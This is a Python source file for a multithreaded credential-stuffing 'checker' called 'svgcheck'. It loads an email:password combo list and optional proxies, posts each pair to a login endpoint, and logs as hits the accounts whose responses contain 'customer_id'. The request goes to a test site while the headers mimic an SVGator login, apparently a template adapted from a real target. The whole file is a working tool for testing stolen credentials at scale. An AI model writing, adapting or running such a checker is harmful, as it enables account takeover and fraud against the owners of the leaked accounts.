from dna.setup import * #importing the DNA library that is going to help you to make checkers 
from dna.threadingz import *
import requests,os
from colorama import Fore,Style

threadingz = Threadingz() #Importing DNA safe synchronized threading system
dna = DNA() #here we initialize the setup from DNA's library

class Checker:
    
    def __init__(self,checker_name,proxychoice):
        """This is where you initialise your checker, needs the name of your checker so it transform it into ascii

        Args:
            checker_name (str): name of your checker
        """
        self.checker_name = checker_name
        
        dna.generate_title(f'{checker_name}') #printing you ascii TITLE
        
        dna.load_combos() #loading the combo.txt for you
        
        if proxychoice == True: #if we wanna build our checker proxy based
            
            dna.load_proxylist() #loading our combolist
        else:
            pass #do i need to explain this word ?
        
        self.hits = 0
        self.fails = 0
        self.errors = 0
        self.retries = 0
        self.checked = 0
        
    def request(self,acc):
        """This is were you checker works. After seting everything 

        Args:
            acc (str): the account that the checker is going to send
        """
        try:          
            self.email,self.password = acc.split(':')
            
        except:
            
            print(Fore.LIGHTWHITE_EX+f'[*] Invalid Account')          
            return
        
        self.headers = {
            
            'content-type': 'application/json',
            'referer': 'https://app.svgator.com/auth/login/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
            } 
            
        self.data = {"email": f"{self.email}", "password": f"{self.password}"}
        try:
            with requests.post(f'http://testhtml5.vulnweb.com/',headers=self.headers, json= self.data,timeout=1) as r:
                
                if 'customer_id' in r.text:
                    
                    self.hits+=1
                    self.checked += 1
                  
                    print(Fore.LIGHTGREEN_EX+f'[*] Hit >> {acc}'+ Style.RESET_ALL)
                    
                    dna.output(acc)
                    
                elif 'Invalid username or password' in r.text:
                    
                    self.fails+=1
                    self.checked += 1
                                   
        except requests.exceptions.ConnectTimeout: #if we get a timeout
            
            self.retries += 1
            dna.queue.put(acc) #puttin back the account in queue for re-check, since it's a FIFO queue, it will be checked last.
            
        except: #if we gat any other error
        
            self.errors+=1
            pass

if __name__ == '__main__' :
    os.system('cls')  #clearing the screen, change to "clear" if you're on linux    
    c = Checker('svgcheck',False) #Creating our checker, Use True or False to chose between proxyless or proxy enabled checker

    print('──────────────────────────────────\n')
    num_threads= int(input(Fore.LIGHTBLUE_EX+'Threads ? >>> '+Style.RESET_ALL))
    print('\n──────────────────────────────────\n')

    while not dna.queue.empty():
        
        for i in range(num_threads): #for the numbers of thread users chose
            
            threadingz.system(1,c.request,dna.queue.get()) #we add one thread, working on the checker using the account from the queue

        threadingz.t.join() #we join every thread
        
    dna.queue.join() #once the queue is empty 
    
    print('>> Completed') #checker is completed !

